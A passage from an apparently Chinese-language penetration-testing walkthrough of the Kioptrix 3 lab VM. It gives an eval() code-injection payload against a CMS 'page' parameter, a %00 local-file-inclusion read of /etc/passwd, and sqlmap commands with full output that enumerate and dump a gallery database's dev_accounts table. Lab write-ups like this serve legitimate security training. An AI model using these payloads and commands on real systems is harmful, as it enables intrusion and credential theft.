class="comment">/**</span></span><br><span class="line"><span class="comment">         * Returns a global variable</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getInputString</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$default_value</span> = <span class="string">&quot;&quot;</span>, <span class="variable">$format</span> = <span class="string">&quot;GPCS&quot;</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="comment">//order of retrieve default GPCS (get, post, cookie, session);</span></span><br><span class="line">                <span class="variable">$format_defines</span> = <span class="keyword">array</span> (</span><br><span class="line">                <span class="string">&#x27;G&#x27;</span>=&gt;<span class="string">&#x27;_GET&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;P&#x27;</span>=&gt;<span class="string">&#x27;_POST&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;C&#x27;</span>=&gt;<span class="string">&#x27;_COOKIE&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;S&#x27;</span>=&gt;<span class="string">&#x27;_SESSION&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;R&#x27;</span>=&gt;<span class="string">&#x27;_REQUEST&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;F&#x27;</span>=&gt;<span class="string">&#x27;_FILES&#x27;</span>,</span><br><span class="line">                );</span><br><span class="line">                <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/[G|P|C|S|R|F]/&quot;</span>, <span class="variable">$format</span>, <span class="variable">$matches</span>); <span class="comment">//splitting to globals order</span></span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$matches</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$glb</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> ( <span class="keyword">isset</span> (<span class="variable">$GLOBALS</span>[<span class="variable">$format_defines</span>[<span class="variable">$glb</span>]][<span class="variable">$name</span>]))</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="title function_ invoke__">htmlentities</span> ( <span class="title function_ invoke__">trim</span> ( <span class="variable">$GLOBALS</span>[<span class="variable">$format_defines</span>[<span class="variable">$glb</span>]][<span class="variable">$name</span>] ) , ENT_NOQUOTES ) ;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$default_value</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可见如果能控制 $page 的值，即可利用 <code>eval()</code>
实现远程代码执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;new &quot;</span>.<span class="variable">$plugin</span>.<span class="string">&quot;Starter(&#x27;&quot;</span>.<span class="variable">$page</span>.<span class="string">&quot;&#x27;);&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>由于 $page 通过 getInputString() 函数从请求数据包获取，分析
getInputString() 函数中下面的代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">htmlentities</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$GLOBALS</span>[<span class="variable">$format_defines</span>[<span class="variable">$glb</span>]][<span class="variable">$name</span>]), ENT_NOQUOTES);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>trim()</code>: 去除变量值的首尾空白字符。</li>
<li><code>htmlentities()</code>: 将字符转换为 HTML 实体，防止 XSS
攻击，特别是在输出到浏览器时。</li>
<li><code>ENT_NOQUOTES</code>: 指定不转换引号。</li>
</ul>
<p>由于此处只用了转义函数 <code>htmlentities()</code> 【将特殊字符转换为
HTML 实体】，并未进行其他安全检测，为此可利用 page
参数注入恶意代码实现远程代码执行，示例</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">page=index<span class="string">&#x27;);$&#123;print(&#x27;</span>RCEVulnerable<span class="string">&#x27;)&#125;;#</span></span><br><span class="line"><span class="string"># urlencode</span></span><br><span class="line"><span class="string">page=index%27%29%3B%24%7Bprint%28%27RCEVulnerable%27%29%7D%3B%23</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410022043572.jpg" /></p>
<p>RCE 可成功利用</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410022043573.jpg" /></p>
<p>所以可进一步利用 system() 函数执行恶意命令，如反弹 shell，示例参见
2.1 exploit.py</p>
<h3 id="lfi">3.2. LFI</h3>
<p>由 router.php 可知，$plugin 也可控，为此可能存在 LFI</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;core/plugs/&quot;</span>.<span class="variable">$plugin</span>.<span class="string">&quot;Starter.php&quot;</span>);</span><br></pre></td></tr></table></figure>
<p><code>%00</code> 截断文件包含利用条件：<br />
- magic_quotes_gpc=off<br />
- PHP版本低于5.3.4</p>
<p>利用 3.1 的 RCE 执行 phpinfo() 查看 php 配置</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">page=index<span class="string">&#x27;);phpinfo();#</span></span><br><span class="line"><span class="string">// urlencode </span></span><br><span class="line"><span class="string">page=index&#x27;</span>)%<span class="number">3</span>Bphpinfo()%<span class="number">3</span>B%<span class="number">23</span></span><br></pre></td></tr></table></figure>
<p>可见满足 <code>%00</code> 截断文件包含利用条件</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410022211529.jpg" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410022211530.jpg" /></p>
<p>LFI 读取 <code>/etc/passwd</code> 成功</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410022215688.jpg" /></p>
<h3 id="sql-注入">3.3. SQL 注入</h3>
<p>Web 下的 gallery.php 存在SQL注入【<a
target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/15891">GALLARIFIC PHP Photo
Gallery Script - 'gallery.php' SQL Injection - PHP webapps
Exploit</a>】</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://kioptrix3.com/gallery/gallery.php?id=1&quot;</span> --batch --dbs</span><br><span class="line">sqlmap -u <span class="string">&quot;http://kioptrix3.com/gallery/gallery.php?id=1&quot;</span> --batch -D gallery --tables</span><br><span class="line">sqlmap -u <span class="string">&quot;http://kioptrix3.com/gallery/gallery.php?id=1&quot;</span> --batch -D gallery -T dev_accounts --dump</span><br></pre></td></tr></table></figure>
<p>查数据库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># sqlmap -u &quot;http://kioptrix3.com/gallery/gallery.php?id=1&quot; --batch --dbs   </span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[<span class="string">&#x27;]_____ ___ ___  &#123;1.8.2#stable&#125;</span></span><br><span class="line"><span class="string">|_ -| . [(]     | .&#x27;</span>| . |</span><br><span class="line">|___|_  [<span class="string">&quot;]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   https://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 10:56:12 /2024-10-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[10:56:14] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[10:56:14] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests</span></span><br><span class="line"><span class="string">you have not declared cookie(s), while server wants to set its own (&#x27;PHPSESSID=220b0f241ef...d4d716cd85&#x27;). Do you want to use those [Y/n] Y</span></span><br><span class="line"><span class="string">[10:56:14] [INFO] checking if the target is protected by some kind of WAF/IPS</span></span><br><span class="line"><span class="string">[10:56:14] [INFO] testing if the target URL content is stable</span></span><br><span class="line"><span class="string">[10:56:14] [INFO] target URL content is stable</span></span><br><span class="line"><span class="string">[10:56:14] [INFO] testing if GET parameter &#x27;id&#x27; is dynamic</span></span><br><span class="line"><span class="string">[10:56:14] [INFO] GET parameter &#x27;id&#x27; appears to be dynamic</span></span><br><span class="line"><span class="string">[10:56:14] [INFO] heuristic (basic) test shows that GET parameter &#x27;id&#x27; might be injectable (possible DBMS: &#x27;MySQL&#x27;)</span></span><br><span class="line"><span class="string">[10:56:14] [INFO] heuristic (XSS) test shows that GET parameter &#x27;id&#x27; might be vulnerable to cross-site scripting (XSS) attacks</span></span><br><span class="line"><span class="string">[10:56:14] [INFO] testing for SQL injection on GET parameter &#x27;id&#x27;</span></span><br><span class="line"><span class="string">it looks like the back-end DBMS is &#x27;MySQL&#x27;. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y</span></span><br><span class="line"><span class="string">for the remaining tests, do you want to include all tests for &#x27;MySQL&#x27; extending provided level (1) and risk (1) values? [Y/n] Y</span></span><br><span class="line"><span class="string">[10:56:14] [INFO] testing &#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span></span><br><span class="line"><span class="string">[10:56:14] [WARNING] reflective value(s) found and filtering out</span></span><br><span class="line"><span class="string">[10:56:15] [INFO] testing &#x27;Boolean-based blind - Parameter replace (original value)&#x27;</span></span><br><span class="line"><span class="string">[10:56:15] [INFO] GET parameter &#x27;id&#x27; appears to be &#x27;Boolean-based blind - Parameter replace (original value)&#x27; injectable (with --code=500)</span></span><br><span class="line"><span class="string">[10:56:15] [INFO] testing &#x27;Generic inline queries&#x27;</span></span><br><span class="line"><span class="string">[10:56:15] [INFO] testing &#x27;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)&#x27;</span></span><br><span class="line"><span class="string">[10:56:15] [INFO] testing &#x27;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)&#x27;</span></span><br><span class="line"><span class="string">[10:56:15] [INFO] testing &#x27;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)&#x27;</span></span><br><span class="line"><span class="string">[10:56:15] [INFO] testing &#x27;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)&#x27;</span></span><br><span class="line"><span class="string">[10:56:15] [INFO] testing &#x27;MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)&#x27;</span></span><br><span class="line"><span class="string">[10:56:15] [INFO] testing &#x27;MySQL &gt;= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)&#x27;</span></span><br><span class="line"><span class="string">[10:56:15] [INFO] testing &#x27;MySQL &gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)&#x27;</span></span><br><span class="line"><span class="string">[10:56:15] [INFO] testing &#x27;MySQL &gt;= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)&#x27;</span></span><br><span class="line"><span class="string">[10:56:15] [INFO] testing &#x27;MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#x27;</span></span><br><span class="line"><span class="string">[10:56:15] [INFO] testing &#x27;MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#x27;</span></span><br><span class="line"><span class="string">[10:56:15] [INFO] testing &#x27;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#x27;</span></span><br><span class="line"><span class="string">[10:56:15] [INFO] testing &#x27;MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#x27;</span></span><br><span class="line"><span class="string">[10:56:15] [INFO] testing &#x27;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)&#x27;</span></span><br><span class="line"><span class="string">[10:56:15] [INFO] testing &#x27;MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)&#x27;</span></span><br><span class="line"><span class="string">[10:56:15] [INFO] testing &#x27;MySQL &gt;= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#x27;</span></span><br><span class="line"><span class="string">[10:56:15] [INFO] testing &#x27;MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)&#x27;</span></span><br><span class="line"><span class="string">[10:56:15] [INFO] GET parameter &#x27;id&#x27; is &#x27;MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)&#x27; injectable </span></span><br><span class="line"><span class="string">[10:56:15] [INFO] testing &#x27;MySQL inline queries&#x27;</span></span><br><span class="line"><span class="string">[10:56:15] [INFO] testing &#x27;MySQL &gt;= 5.0.12 stacked queries (comment)&#x27;</span></span><br><span class="line"><span class="string">[10:56:15] [INFO] testing &#x27;MySQL &gt;= 5.0.12 stacked queries&#x27;</span></span><br><span class="line"><span class="string">[10:56:15] [INFO] testing &#x27;MySQL &gt;= 5.0.12 stacked queries (query SLEEP - comment)&#x27;</span></span><br><span class="line"><span class="string">[10:56:15] [INFO] testing &#x27;MySQL &gt;= 5.0.12 stacked queries (query SLEEP)&#x27;</span></span><br><span class="line"><span class="string">[10:56:15] [INFO] testing &#x27;MySQL &lt; 5.0.12 stacked queries (BENCHMARK - comment)&#x27;</span></span><br><span class="line"><span class="string">[10:56:15] [INFO] testing &#x27;MySQL &lt; 5.0.12 stacked queries (BENCHMARK)&#x27;</span></span><br><span class="line"><span class="string">[10:56:15] [INFO] testing &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;</span></span><br><span class="line"><span class="string">[10:56:25] [INFO] GET parameter &#x27;id&#x27; appears to be &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27; injectable </span></span><br><span class="line"><span class="string">[10:56:25] [INFO] testing &#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;</span></span><br><span class="line"><span class="string">[10:56:25] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found</span></span><br><span class="line"><span class="string">[10:56:25] [INFO] &#x27;ORDER BY&#x27; technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test</span></span><br><span class="line"><span class="string">[10:56:26] [INFO] target URL appears to have 6 columns in query</span></span><br><span class="line"><span class="string">[10:56:26] [INFO] GET parameter &#x27;id&#x27; is &#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27; injectable</span></span><br><span class="line"><span class="string">GET parameter &#x27;id&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</span></span><br><span class="line"><span class="string">sqlmap identified the following injection point(s) with a total of 49 HTTP(s) requests:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: id (GET)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: Boolean-based blind - Parameter replace (original value)</span></span><br><span class="line"><span class="string">    Payload: id=(SELECT (CASE WHEN (5001=5001) THEN 1 ELSE (SELECT 7850 UNION SELECT 6816) END))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)</span></span><br><span class="line"><span class="string">    Payload: id=1 OR ROW(4327,5954)&gt;(SELECT COUNT(*),CONCAT(0x71627a7071,(SELECT (ELT(4327=4327,1))),0x7176707a71,FLOOR(RAND(0)*2))x FROM (SELECT 9657 UNION SELECT 7647 UNION SELECT 9691 UNION SELECT 4112)a GROUP BY x)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: id=1 AND (SELECT 2419 FROM (SELECT(SLEEP(5)))Zmmy)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 6 columns</span></span><br><span class="line"><span class="string">    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x71627a7071,0x78764251667270577962666b647771627a4876747a5376794b42757a7655507141644e50757a4c7a,0x7176707a71),NULL,NULL,NULL,NULL-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[10:56:26] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">web server operating system: Linux Ubuntu 8.04 (Hardy Heron)</span></span><br><span class="line"><span class="string">web application technology: PHP 5.2.4, PHP, Apache 2.2.8</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 4.1</span></span><br><span class="line"><span class="string">[10:56:26] [INFO] fetching database names</span></span><br><span class="line"><span class="string">[10:56:26] [INFO] retrieved: &#x27;information_schema&#x27;</span></span><br><span class="line"><span class="string">[10:56:26] [INFO] retrieved: &#x27;gallery&#x27;</span></span><br><span class="line"><span class="string">[10:56:26] [INFO] retrieved: &#x27;mysql&#x27;</span></span><br><span class="line"><span class="string">available databases [3]:                        </span></span><br><span class="line"><span class="string">[*] gallery</span></span><br><span class="line"><span class="string">[*] information_schema</span></span><br><span class="line"><span class="string">[*] mysql</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[10:56:26] [WARNING] HTTP error codes detected during run:</span></span><br><span class="line"><span class="string">500 (Internal Server Error) - 21 times</span></span><br><span class="line"><span class="string">[10:56:26] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/kioptrix3.com&#x27;</span></span><br><span class="line"><span class="string">[10:56:26] [WARNING] your sqlmap version is outdated</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 10:56:26 /2024-10-02/</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<p>查询 gallery 数据库的数据表</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># sqlmap -u &quot;http://kioptrix3.com/gallery/gallery.php?id=1&quot; --batch -D gallery --tables</span></span><br><span class="line">        ___</span><br><span class="line">       __H__                                     </span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.8.2<span class="comment">#stable&#125;               </span></span><br><span class="line">|_ -| . [<span class="string">&#x27;]     | .&#x27;</span>| . |                      </span><br><span class="line">|___|_  [.]_|_|_|__,|  _|                     </span><br><span class="line">      |_|V...       |_|   https://sqlmap.org             </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 10:56:56 /2024-10-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[10:56:56] [INFO] resuming back-end DBMS &#x27;</span>mysql<span class="string">&#x27; </span></span><br><span class="line"><span class="string">[10:56:56] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[10:56:57] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests</span></span><br><span class="line"><span class="string">you have not declared cookie(s), while server wants to set its own (&#x27;</span>PHPSESSID=2f43c428c52...00a66eddbf<span class="string">&#x27;). Do you want to use those [Y/n] Y</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: id (GET)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: Boolean-based blind - Parameter replace (original value)</span></span><br><span class="line"><span class="string">    Payload: id=(SELECT (CASE WHEN (5001=5001) THEN 1 ELSE (SELECT 7850 UNION SELECT 6816) END))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)</span></span><br><span class="line"><span class="string">    Payload: id=1 OR ROW(4327,5954)&gt;(SELECT COUNT(*),CONCAT(0x71627a7071,(SELECT (ELT(4327=4327,1))),0x7176707a71,FLOOR(RAND(0)*2))x FROM (SELECT 9657 UNION SELECT 7647 UNION SELECT 9691 UNION SELECT 4112)a GROUP BY x)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: id=1 AND (SELECT 2419 FROM (SELECT(SLEEP(5)))Zmmy)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 6 columns</span></span><br><span class="line"><span class="string">    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x71627a7071,0x78764251667270577962666b647771627a4876747a5376794b42757a7655507141644e50757a4c7a,0x7176707a71),NULL,NULL,NULL,NULL-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[10:56:57] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">web server operating system: Linux Ubuntu 8.04 (Hardy Heron)</span></span><br><span class="line"><span class="string">web application technology: PHP 5.2.4, Apache 2.2.8, PHP</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 4.1</span></span><br><span class="line"><span class="string">[10:56:57] [INFO] fetching tables for database: &#x27;</span>gallery<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:56:57] [INFO] retrieved: &#x27;</span>dev_accounts<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:56:57] [INFO] retrieved: &#x27;</span>gallarific_comments<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:56:57] [INFO] retrieved: &#x27;</span>gallarific_galleries<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:56:57] [INFO] retrieved: &#x27;</span>gallarific_photos<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:56:57] [INFO] retrieved: &#x27;</span>gallarific_settings<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:56:58] [INFO] retrieved: &#x27;</span>gallarific_stats<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:56:58] [INFO] retrieved: &#x27;</span>gallarific_users<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Database: gallery                                   </span></span><br><span class="line"><span class="string">[7 tables]</span></span><br><span class="line"><span class="string">+----------------------+</span></span><br><span class="line"><span class="string">| dev_accounts         |</span></span><br><span class="line"><span class="string">| gallarific_comments  |</span></span><br><span class="line"><span class="string">| gallarific_galleries |</span></span><br><span class="line"><span class="string">| gallarific_photos    |</span></span><br><span class="line"><span class="string">| gallarific_settings  |</span></span><br><span class="line"><span class="string">| gallarific_stats     |</span></span><br><span class="line"><span class="string">| gallarific_users     |</span></span><br><span class="line"><span class="string">+----------------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[10:56:58] [WARNING] HTTP error codes detected during run:</span></span><br><span class="line"><span class="string">500 (Internal Server Error) - 1 times</span></span><br><span class="line"><span class="string">[10:56:58] [INFO] fetched data logged to text files under &#x27;</span>/root/.local/share/sqlmap/output/kioptrix3.com<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:56:58] [WARNING] your sqlmap version is outdated</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 10:56:58 /2024-10-02/</span></span><br></pre></td></tr></table></figure>
<p>从 dev_accounts 查用户信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 